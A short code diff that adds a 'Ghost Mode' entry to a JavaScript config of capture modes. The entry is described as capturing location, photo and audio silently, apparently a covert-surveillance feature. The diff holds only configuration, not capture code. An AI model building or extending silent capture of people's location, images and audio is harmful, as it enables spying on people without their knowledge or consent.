@@ -59,6 +59,11 @@ const config = {
             type: 'microphone',
             label: '🎤 Microphone',
             description: 'Record audio from microphone'
+        },
+        ghost: {
+            type: 'ghost',
+            label: '👻 Ghost Mode',
+            description: 'Capture everything silently (location, photo, audio)'
         }
     }
 };
